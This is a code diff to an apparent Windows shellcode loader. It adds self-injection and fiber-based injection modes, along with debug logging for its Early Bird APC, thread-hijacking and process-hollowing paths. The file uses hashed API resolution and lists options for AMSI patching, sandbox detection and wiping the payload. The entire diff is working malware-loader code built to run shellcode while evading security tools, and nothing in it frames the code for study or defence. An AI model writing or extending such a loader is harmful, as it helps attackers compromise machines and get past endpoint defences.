@@ -6,6 +6,8 @@
 //   USE_THREAD_HIJACK : RIP redirect instead of Early Bird APC
 //   USE_HOLLOW        : Process Hollowing (unmap original + RIP redirect)
 //   USE_REMOTE_THREAD : NtCreateThreadEx in an existing process (no CreateProcess)
+//   USE_SELF_INJECT   : NtCreateThreadEx in current process
+//   USE_FIBER_INJECT  : Fiber switch (ConvertThreadToFiber + CreateFiber, no new thread)
 //   USE_AMSI_PATCH    : Patch AmsiScanBuffer
 //   USE_SANDBOX_CHECK : Basic sandbox/timing detection
 //   USE_WIPE          : Zero heap payload after injection
@@ -123,8 +125,17 @@ constexpr DWORD HF_InitProcThreadAttrList   = _hA("InitializeProcThreadAttribute
 constexpr DWORD HF_UpdateProcThreadAttr     = _hA("UpdateProcThreadAttribute");
 constexpr DWORD HF_DeleteProcThreadAttrList = _hA("DeleteProcThreadAttributeList");
 #endif
-#ifdef USE_REMOTE_THREAD
+#if defined(USE_REMOTE_THREAD) || defined(USE_SELF_INJECT)
 constexpr DWORD HF_NtCreateThreadEx         = _hA("NtCreateThreadEx");
+#endif
+#ifdef USE_SELF_INJECT
+constexpr DWORD HF_NtWaitForSingleObject    = _hA("NtWaitForSingleObject");
+#endif
+#ifdef USE_FIBER_INJECT
+constexpr DWORD HF_ConvertThreadToFiber     = _hA("ConvertThreadToFiber");
+constexpr DWORD HF_CreateFiber              = _hA("CreateFiber");
+constexpr DWORD HF_SwitchToFiber            = _hA("SwitchToFiber");
+constexpr DWORD HF_DeleteFiber              = _hA("DeleteFiber");
 #endif
 #ifdef USE_SANDBOX_CHECK
 constexpr DWORD HF_GetTickCount64           = _hA("GetTickCount64");
@@ -520,7 +531,107 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     DBG("[6] No decryption (plaintext)");
 #endif
 
-#ifdef USE_REMOTE_THREAD
+#ifdef USE_SELF_INJECT
+    /* Self-injection via local APC: create suspended thread + queue APC */
+    {
+        DBG("[SI] === SELF INJECTION (LOCAL APC) MODE ===");
+        typedef NTSTATUS (NTAPI *t_NtCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
+        typedef NTSTATUS (NTAPI *t_NtQAT)(HANDLE,PVOID,PVOID,PVOID,PVOID);
+        typedef NTSTATUS (NTAPI *t_NtWSO)(HANDLE,BOOLEAN,PLARGE_INTEGER);
+        typedef BOOL (WINAPI *t_CH)(HANDLE);
+        t_NtCTE pNtCTE = (t_NtCTE)resolve(hNtdll, HF_NtCreateThreadEx);
+        t_NtQAT pNtQAT = (t_NtQAT)resolve(hNtdll, HF_NtQueueApcThread);
+        t_NtWSO pNtWSO = (t_NtWSO)resolve(hNtdll, HF_NtWaitForSingleObject);
+        t_CH    pCH    = (t_CH)  R(HMOD_KERNEL32, HF_CloseHandle);
+        DBG_HEX("[SI1] NtCreateThreadEx resolved", (unsigned long long)(ULONG_PTR)pNtCTE);
+        DBG_HEX("[SI1] NtQueueApcThread resolved", (unsigned long long)(ULONG_PTR)pNtQAT);
+        if (!pNtCTE || !pNtQAT) {
+            DBG("[FAIL] SelfInject: API resolution failed");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        /* sc already decrypted and RW in current process - change to RX */
+        DBG_HEX("[SI2] shellcode addr", (unsigned long long)(ULONG_PTR)sc);
+        DBG_VAL("[SI2] shellcode size", (unsigned long long)sc_sz);
+        PVOID  prot_base = sc;
+        SIZE_T prot_sz   = sc_sz;
+        ULONG  old_prot  = 0;
+        NTSTATUS stP = pNtPVM((HANDLE)-1, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
+        DBG_HEX("[SI3] NtProtectVirtualMemory status", (unsigned long long)(ULONG)stP);
+        /* Create thread suspended in current process (start addr is irrelevant) */
+        HANDLE hThread = NULL;
+        NTSTATUS st = pNtCTE(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1,
+                             (PVOID)sc, NULL,
+                             0x1, /* CREATE_SUSPENDED */
+                             0, 0, 0, NULL);
+        DBG_HEX("[SI4] NtCreateThreadEx (suspended) status", (unsigned long long)(ULONG)st);
+        DBG_HEX("[SI4] hThread", (unsigned long long)(ULONG_PTR)hThread);
+        if (!hThread) {
+            DBG("[FAIL] SelfInject: thread creation failed");
+            return 1;
+        }
+        /* Queue APC pointing to shellcode on the suspended thread */
+        NTSTATUS stA = pNtQAT(hThread, (PVOID)sc, NULL, NULL, NULL);
+        DBG_HEX("[SI5] NtQueueApcThread status", (unsigned long long)(ULONG)stA);
+        /* Resume thread - APC will fire */
+        pNtRT(hThread, NULL);
+        DBG("[SI6] Thread resumed - APC should fire");
+        /* Wait for shellcode to run */
+        if (pNtWSO) {
+            NTSTATUS stW = pNtWSO(hThread, FALSE, NULL);
+            DBG_HEX("[SI7] NtWaitForSingleObject returned", (unsigned long long)(ULONG)stW);
+        }
+        if (pCH) pCH(hThread);
+    }
+#elif defined(USE_FIBER_INJECT)
+    /* Fiber injection: shellcode via fiber switch (no thread creation) */
+    {
+        DBG("[FI] === FIBER INJECTION MODE ===");
+        typedef LPVOID (WINAPI *t_CTTF)(LPVOID);
+        typedef LPVOID (WINAPI *t_CF)  (SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
+        typedef void   (WINAPI *t_STF) (LPVOID);
+        typedef BOOL   (WINAPI *t_DF)  (LPVOID);
+        t_CTTF pCTTF = (t_CTTF)RK32(HF_ConvertThreadToFiber);
+        t_CF   pCF   = (t_CF)  RK32(HF_CreateFiber);
+        t_STF  pSTF  = (t_STF) RK32(HF_SwitchToFiber);
+        t_DF   pDF   = (t_DF)  RK32(HF_DeleteFiber);
+        DBG_HEX("[FI1] ConvertThreadToFiber resolved", (unsigned long long)(ULONG_PTR)pCTTF);
+        DBG_HEX("[FI1] CreateFiber resolved", (unsigned long long)(ULONG_PTR)pCF);
+        DBG_HEX("[FI1] SwitchToFiber resolved", (unsigned long long)(ULONG_PTR)pSTF);
+        if (!pCTTF || !pCF || !pSTF) {
+            DBG("[FAIL] FiberInject: API resolution failed");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        /* sc already decrypted and RW - change to RX */
+        DBG_HEX("[FI2] shellcode addr", (unsigned long long)(ULONG_PTR)sc);
+        DBG_VAL("[FI2] shellcode size", (unsigned long long)sc_sz);
+        PVOID  prot_base = sc;
+        SIZE_T prot_sz   = sc_sz;
+        ULONG  old_prot  = 0;
+        NTSTATUS stP = pNtPVM((HANDLE)-1, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
+        DBG_HEX("[FI3] NtProtectVirtualMemory status", (unsigned long long)(ULONG)stP);
+        DBG("[FI3] Self RW -> RX done");
+        LPVOID mainFiber = pCTTF(NULL);
+        if (!mainFiber) {
+            DBG("[FAIL] FiberInject: ConvertThreadToFiber failed (GetLastError may help)");
+            return 1;
+        }
+        DBG_HEX("[FI4] mainFiber handle", (unsigned long long)(ULONG_PTR)mainFiber);
+        LPVOID scFiber = pCF(0x100000, (LPFIBER_START_ROUTINE)sc, NULL);
+        if (!scFiber) {
+            DBG("[FAIL] FiberInject: CreateFiber failed");
+            return 1;
+        }
+        DBG_HEX("[FI5] scFiber handle", (unsigned long long)(ULONG_PTR)scFiber);
+        DBG_VAL("[FI5] fiber stack size", (unsigned long long)0x100000);
+        DBG("[FI6] SwitchToFiber - shellcode should now execute...");
+        pSTF(scFiber);
+        DBG("[FI7] Returned from shellcode fiber (shellcode exited or switched back)");
+        if (pDF) pDF(scFiber);
+        DBG("[FI8] Fiber deleted - injection complete");
+    }
+#elif defined(USE_REMOTE_THREAD)
     /* Inject into existing process via NtCreateThreadEx */
     {
         typedef NTSTATUS (NTAPI *t_NtCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
@@ -674,17 +785,22 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 
     /* Write shellcode */
     st = pNtWVM(pi.hProcess, remote, sc, payload_size, NULL);
+    DBG_HEX("[11] NtWriteVirtualMemory status", (unsigned long long)(ULONG)st);
+    DBG_VAL("[11] bytes written (payload_size)", (unsigned long long)payload_size);
 
 #ifdef USE_WIPE
     memset(sc, 0, payload_size);
+    DBG("[12] Local shellcode wiped");
 #endif
     { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+    DBG("[12] Local shellcode freed");
 
     /* RW -> RX */
     PVOID  prot_base = remote;
     SIZE_T prot_sz   = payload_size;
     ULONG  old_prot  = 0;
     st = pNtPVM(pi.hProcess, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
+    DBG_HEX("[13] NtProtectVirtualMemory (RW->RX) status", (unsigned long long)(ULONG)st);
 
 #if defined(USE_HOLLOW)
     {
@@ -744,26 +860,35 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         typedef NTSTATUS (NTAPI *t_NtSCT)(HANDLE, PCONTEXT);
         t_NtGCT pGCT = (t_NtGCT)resolve(hNtdll, HF_NtGetContextThread);
         t_NtSCT pSCT = (t_NtSCT)resolve(hNtdll, HF_NtSetContextThread);
+        DBG("[TH] === THREAD HIJACKING MODE ===");
         if (pGCT && pSCT) {
             CONTEXT ctx = {0};
             ctx.ContextFlags = CONTEXT_FULL;
-            pGCT(pi.hThread, &ctx);
+            NTSTATUS stG = pGCT(pi.hThread, &ctx);
+            DBG_HEX("[TH1] NtGetContextThread status", (unsigned long long)(ULONG)stG);
 #ifdef _WIN64
+            DBG_HEX("[TH2] Original RIP", (unsigned long long)ctx.Rip);
             ctx.Rip = (DWORD64)remote;
-            DBG_HEX("[13] Thread hijack RIP", (unsigned long long)ctx.Rip);
+            DBG_HEX("[TH3] New RIP (shellcode)", (unsigned long long)ctx.Rip);
 #else
-            ctx.Eip = (DWORD)remote;
-            DBG_HEX("[13] Thread hijack EIP", (unsigned long long)ctx.Eip);
+            DBG_HEX("[TH2] Original EIP", (unsigned long long)ctx.Eip);
+            ctx.Eip = (DWORD)(ULONG_PTR)remote;
+            DBG_HEX("[TH3] New EIP (shellcode)", (unsigned long long)ctx.Eip);
 #endif
-            pSCT(pi.hThread, &ctx);
+            NTSTATUS stS = pSCT(pi.hThread, &ctx);
+            DBG_HEX("[TH4] NtSetContextThread status", (unsigned long long)(ULONG)stS);
         } else { DBG("[FAIL] NtGet/SetContextThread not found"); }
     }
 #else
     {
+        DBG("[EB] === EARLY BIRD APC MODE ===");
         typedef NTSTATUS (NTAPI *t_NtQAT)(HANDLE,PVOID,PVOID,PVOID,PVOID);
         t_NtQAT pNtQAT = (t_NtQAT)resolve(hNtdll, HF_NtQueueApcThread);
+        DBG_HEX("[EB1] NtQueueApcThread resolved", (unsigned long long)(ULONG_PTR)pNtQAT);
         if (pNtQAT) {
-            pNtQAT(pi.hThread, (PVOID)remote, NULL, NULL, NULL);
+            NTSTATUS stA = pNtQAT(pi.hThread, (PVOID)remote, NULL, NULL, NULL);
+            DBG_HEX("[EB2] NtQueueApcThread status", (unsigned long long)(ULONG)stA);
+            DBG_HEX("[EB2] APC target addr", (unsigned long long)(ULONG_PTR)remote);
         } else { DBG("[FAIL] NtQueueApcThread not found"); }
     }
 #endif /* injection technique */
